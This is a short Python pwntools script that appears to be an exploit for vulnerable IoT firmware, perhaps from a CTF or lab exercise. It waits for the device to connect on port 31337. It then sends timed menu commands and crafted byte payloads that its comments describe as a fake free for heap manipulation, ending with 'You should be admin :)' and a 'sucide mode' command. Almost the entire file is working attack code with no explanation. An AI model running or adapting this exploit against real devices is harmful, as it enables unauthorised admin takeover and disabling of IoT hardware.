from pwn import *

import time 

# The IoT device hosting the vulnerable firmware should 
# connect to the computer running this script on port 31337.

l = listen(31337)
svr = l.wait_for_connection()
print("Received connection!")


for x in range(0,2,1):
    l.send("1\x00")
    time.sleep(1)
    l.send("2\x00")
    time.sleep(1)


#l.send("3\x00")

time.sleep(5)


for x in range(0,2,1):
    l.send("1\x00")
    time.sleep(1)
    l.send("2\x00")
    time.sleep(1)

# This is fake free
#l.send("4\x00")

l.send("c\x00")

time.sleep(5)

l.send("4\x00")

time.sleep(5)

l.send("6\x08\x00\x00\x00")

time.sleep(5)

l.send("6\x08\x00\x00\x00")

time.sleep(5)

l.send("7\x30\x00\x00\x00\x00\x00\x00\x00" + "\x01" * 30)

time.sleep(5)

l.send("c\x00")
print("You should be admin :)")

# Activating sucide mode! :)
l.send("e\x00")

